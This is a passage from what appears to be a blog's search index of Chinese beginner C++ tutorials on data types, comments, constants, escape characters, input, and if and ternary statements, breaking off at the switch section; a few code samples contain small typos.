        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++数据类型及数据的运用</title>
    <url>/2021/12/08/C-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="C-程序初始代码"><a href="#C-程序初始代码" class="headerlink" title="C++程序初始代码"></a>C++程序初始代码</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码初学者只需背下即可，每个程序都要有。</p>
<span id="more"></span>

<h1 id="C-注释"><a href="#C-注释" class="headerlink" title="C++注释"></a>C++注释</h1><h2 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h2><p>用法：<code>//描述信息</code></p>
<p>通常放在一行代码的上方或后面，对该代码进行说明。</p>
<p>如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;endl; <span class="comment">//输出hello word</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h2><p>用法：<code>/*描述信息*/</code></p>
<p>通常放在一段代码上方，对该代码做整体说明。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    输出hello world</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="C-数据量"><a href="#C-数据量" class="headerlink" title="C++数据量"></a>C++数据量</h1><h2 id="变量创建的语法"><a href="#变量创建的语法" class="headerlink" title="变量创建的语法"></a>变量创建的语法</h2><p><code>数据类型 变量名 = 变量初始值</code></p>
<p>例如 <code>int a = 10;</code></p>
<p>注意：</p>
<ul>
<li><p>关键字不能作为变量的名称（标识符）</p>
</li>
<li><p>标识符只能由字母、数字、下划线组成</p>
</li>
<li><p>第一个字符必须为字母或下划线</p>
</li>
<li><p>标识符中字母区分大小写</p>
</li>
<li><p>标识符尽量用有阅读性的英文字母，而不要单纯的a、b、c</p>
</li>
</ul>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>作用：用于记录程序中不可更改的数据</p>
<p>C++定义常量的两种方式</p>
<h3 id="define-宏常量：-define-常量名-常量值"><a href="#define-宏常量：-define-常量名-常量值" class="headerlink" title="#define 宏常量：#define 常量名 常量值"></a>#define 宏常量：<code>#define 常量名 常量值</code></h3><p>通常在文件上方定义，表示一个常量，比如定义pi=3.1415926</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;pi&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="const-修饰的变量：const-数据类型-常量名-常量值"><a href="#const-修饰的变量：const-数据类型-常量名-常量值" class="headerlink" title="const 修饰的变量：const 数据类型 常量名 = 常量值"></a>const 修饰的变量：<code>const 数据类型 常量名 = 常量值</code></h3><p>通常在变量定义之前加关键字const，修饰该变量为常量，不可修改</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">int</span> a = <span class="number">12</span>;</span><br><span class="line">     cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>C++规定在创建每一个变量或常量时，必须要指定出相应的数据类型，否则无法为其分配内存</p>
<h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p>作用：整型变量表示的是整数类型的数据</p>
<p>区别：占用空间不同，表示范围不同</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
<th>取值范围</th>
</tr>
</thead>
<tbody><tr>
<td>short（短整型）</td>
<td>2字节</td>
<td>（-2^15~2^15-1）</td>
</tr>
<tr>
<td>int（整型）常用</td>
<td>4字节</td>
<td>（-2^31~2^31-1）</td>
</tr>
<tr>
<td>long（长整型）</td>
<td>Win为4字节，Linux为4字节（32位），8字节（64位）</td>
<td>（-2^31~2^31-1）</td>
</tr>
<tr>
<td>long long（长长整型）</td>
<td>8字节</td>
<td>（-2^63~2^63-1）</td>
</tr>
</tbody></table>
<p>sizeof可以求出数据类型所占内存大小</p>
<p>语法：<code>sizeof（数据类型/变量）</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line">suing <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">34</span>;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;int所占字节&quot;</span>&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;int所占字节&quot;</span>&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(a)&lt;&lt;endl;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    以上两种表达方式均可</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实型（浮点型）"><a href="#实型（浮点型）" class="headerlink" title="实型（浮点型）"></a>实型（浮点型）</h3><p>作用：用于表示小数</p>
<p>浮点型变量分为两种：</p>
<p>1.单精度float</p>
<p>用法：<code>float 变量名 = 数值f；</code>（没有f会默认为双精度，会多一部转换，转换为单精度）</p>
<p>2.双精度double</p>
<p>用法：<code>double 变量名 = 数值；</code></p>
<p>两者区别：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
<th>有效数字范围</th>
</tr>
</thead>
<tbody><tr>
<td>float</td>
<td>4字节</td>
<td>7位有效数字</td>
</tr>
<tr>
<td>double</td>
<td>8字节</td>
<td>15~16位有效数字</td>
</tr>
</tbody></table>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">float</span> f1 = <span class="number">3.1415926f</span>;</span><br><span class="line">        cout&lt;&lt;f1&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(f1)&lt;&lt;endl;<span class="comment">//f1写为float也可</span></span><br><span class="line">    <span class="keyword">double</span> d1 = <span class="number">3.1415926</span>;</span><br><span class="line">        cout&lt;&lt;d1&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">double</span>)&lt;&lt;endl;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    C++默认显示6位有效数字</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面介绍科学计数法</span></span><br><span class="line">    <span class="keyword">double</span> d2 = <span class="number">3e2</span>;<span class="comment">//此处表示3*10^2</span></span><br><span class="line">    <span class="keyword">float</span> a2 = <span class="number">3e-2</span>;<span class="comment">//此处表示3*10^-2</span></span><br><span class="line">    cout&lt;&lt;d2&lt;&lt;a2&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><u>注意：C++输出小数默认显示6位有效数字，若想多显示，需要其他操作。</u></p>
<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>作用：用于表示<u>单个字母</u></p>
<p>用法：<code>char 变量名 = &#39;单个字母&#39;</code>（注意此处为单引号，） 也可以直接用<code>&#39;单个字母&#39;</code></p>
<p>注意：</p>
<ul>
<li>C和C++中字符型变量只占用1个字节</li>
<li>字符型变量并不是把字符本身放到内存中存储，而是把其对应的ASCII编码放入到存储单位</li>
</ul>
<p>例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> hl1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>)&lt;&lt;endl;<span class="comment">//输出其所占字符</span></span><br><span class="line">    	cout&lt;&lt;(<span class="keyword">int</span>)hl1&lt;&lt;endl;<span class="comment">//把字符型变量强转成整型，即a所对应ASCII码</span></span><br><span class="line">    <span class="keyword">char</span> hl2 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        cout&lt;&lt;(<span class="keyword">int</span>)hl2&lt;&lt;endl;</span><br><span class="line">    	cout&lt;&lt;(<span class="keyword">int</span>)<span class="string">&#x27;B&#x27;</span>&lt;&lt;endl;</span><br><span class="line">    	cout&lt;&lt;<span class="string">&#x27;C&#x27;</span>&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>作用：用于表示一些不能显示出来的ASCII字符</p>
<p>现阶段常用的转义字符有：<code>\n \\ \t</code></p>
<p><u>一定注意都是反斜杠</u></p>
<p>详情见下表</p>
<table>
<thead>
<tr>
<th>转义字符</th>
<th>意义</th>
<th>ASCII码值（十进制）</th>
</tr>
</thead>
<tbody><tr>
<td><code>\a</code></td>
<td>响铃(BEL)</td>
<td>007</td>
</tr>
<tr>
<td><code>\b</code></td>
<td>退格(BS) ，将当前位置移到前一列</td>
<td>008</td>
</tr>
<tr>
<td><code>\f</code></td>
<td>换页(FF)，将当前位置移到下页开头</td>
<td>012</td>
</tr>
<tr>
<td><strong><code>\n</code></strong></td>
<td><strong>换行(LF) ，将当前位置移到下一行开头</strong></td>
<td><strong>010</strong></td>
</tr>
<tr>
<td><code>\r</code></td>
<td>回车(CR) ，将当前位置移到本行开头</td>
<td>013</td>
</tr>
<tr>
<td><strong><code>\t</code></strong></td>
<td><strong>水平制表(HT)</strong></td>
<td><strong>009</strong></td>
</tr>
<tr>
<td><code>\v</code></td>
<td>垂直制表(VT)</td>
<td>011</td>
</tr>
<tr>
<td><code>\&#39;</code></td>
<td>单引号</td>
<td>039</td>
</tr>
<tr>
<td><code>\&quot;</code></td>
<td>双引号</td>
<td>034</td>
</tr>
<tr>
<td><strong><code>\\</code></strong></td>
<td><strong>反斜杠</strong></td>
<td><strong>092</strong></td>
</tr>
</tbody></table>
<p><img src="/2021/12/08/C-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/zyzf.png" alt="zyzf"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello \nworld\n&quot;</span>&lt;&lt;endl;<span class="comment">//  换行符/n要在双引号内</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\\&quot;</span>&lt;&lt;endl;<span class="comment">// 两个\\会输出一个\</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;&quot;hello\tworld&quot;&lt;&lt;endl;//水平制表符 \t总共8个位置，后面有多少空格取决于前面有多少字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    其优点就是使文字输出更整齐</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hel\tworld&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hell\tworld&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello\tworld&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>作用：用于表示一串字符</p>
<p>用法：</p>
<p>1.C风格的字符串：<code>char 变量名[] = &quot;变量值&quot;</code>（与字符型变量的区别在于变量名后面有 []，且变量值用双引号）</p>
<p>2.C++风格字符串：<code>string 变量名 = &quot;变量值&quot;</code>（该风格需要包含#include<string>头文件）</string></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> hl[] = <span class="string">&quot;shl&quot;</span>;</span><br><span class="line">    cout&lt;&lt;hl&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    string hla = <span class="string">&quot;shl&quot;</span>;</span><br><span class="line">    cout&lt;&lt;hla&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>作用：布尔数据类型代表真或假的值</p>
<p>bool类型只有两个值</p>
<ul>
<li>true    真（本质为1）</li>
<li>false    假（本质为0）</li>
<li>除了0之外的数字都是真的，字母是假的。若数字后面有字母，则直接看数字，若字母后面有数字，则就是假</li>
</ul>
<p>用法：<code>bool 变量名 = true/false</code></p>
<p>bool类型只占一个字节</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> hl = <span class="literal">true</span>;</span><br><span class="line">    cout&lt;&lt;hl&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    hl = <span class="literal">false</span>;</span><br><span class="line">    cout&lt;&lt;hl&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数据的输入"><a href="#数据的输入" class="headerlink" title="数据的输入"></a>数据的输入</h2><p>作用：用于从键盘获取数据</p>
<p>用法：<code>cin&gt;&gt; 变量</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;你输入的数为&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> b = <span class="literal">false</span>;</span><br><span class="line">    cin&gt;&gt;b;<span class="comment">//除了0之外的数字都是真的，字母是假的。若数字后面有字母，则直接看数字，若字母后面有数字，则就是假</span></span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//也可这样用</span></span><br><span class="line">    <span class="keyword">int</span> b,c,d;</span><br><span class="line">    cin&gt;&gt;b&gt;&gt;c&gt;&gt;d;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;c&lt;&lt;d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的选择选择语句</title>
    <url>/2021/12/11/C-%E4%B8%AD%E7%9A%84%E9%80%89%E6%8B%A9%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h1 id="一、if条件语句"><a href="#一、if条件语句" class="headerlink" title="一、if条件语句"></a>一、if条件语句</h1><p>作用：执行满足条件的语句</p>
<p>if语句的三种形式</p>
<ul>
<li>单行格式if语句</li>
<li>多行格式if语句</li>
<li>多条件的if语句</li>
</ul>
<span id="more"></span>

<h2 id="1-单行格式if语句"><a href="#1-单行格式if语句" class="headerlink" title="1.单行格式if语句"></a>1.单行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//注意此处没有;</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-多行格式if语句"><a href="#2-多行格式if语句" class="headerlink" title="2.多行格式if语句"></a>2.多行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;else&#123;条件不满足是执行的语句&#125;;</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-多条件的if语句"><a href="#3-多条件的if语句" class="headerlink" title="3.多条件的if语句"></a>3.多条件的if语句</h2><p>语法：<code>if(条件1)&#123;条件1满足时执行的代码&#125;else if(条件2)&#123;条件2满足时执行的代码&#125; ... else&#123;以上条件都不满足执行的语句&#125;</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//第一个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">400</span>)<span class="comment">//第二个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得还行&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">300</span>)<span class="comment">//第三个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得有点差&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-嵌套if语句"><a href="#4-嵌套if语句" class="headerlink" title="4.嵌套if语句"></a>4.嵌套if语句</h2><p>if语句里面还有if语句</p>
<p>注意if嵌套语句中条件的大小顺序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;<span class="comment">//此处判断条件要从大到小，否则无法正常运行</span></span><br><span class="line">        <span class="keyword">if</span>(score&gt;<span class="number">650</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望985&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">600</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望211&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望一本&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、三目运算符"><a href="#二、三目运算符" class="headerlink" title="二、三目运算符"></a>二、三目运算符</h1><p>作用：通过三目运算符实现简单的判断</p>
<p>语法：<code>条件 ? 代码1 : 代码2</code></p>
<p>解释：</p>
<p>如果满足条件，则执行代码1，否则执行代码2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b;<span class="comment">//注意此处为&gt;&gt;而不是,</span></span><br><span class="line">    </span><br><span class="line">    c=(a&gt;b?a:b);</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    (a&gt;b?a:b)=<span class="number">50</span>;<span class="comment">//三目运算符同样可以这样使用，表示将a b中较大的一个赋值为50</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、switch条件语句"><a href="#三、switch条件语句" class="headerlink" title="三、switch条件语句"></a>三、switch条件语句</h1><p>作用：执行多条件分支语句</p>
<p>语法：</p>
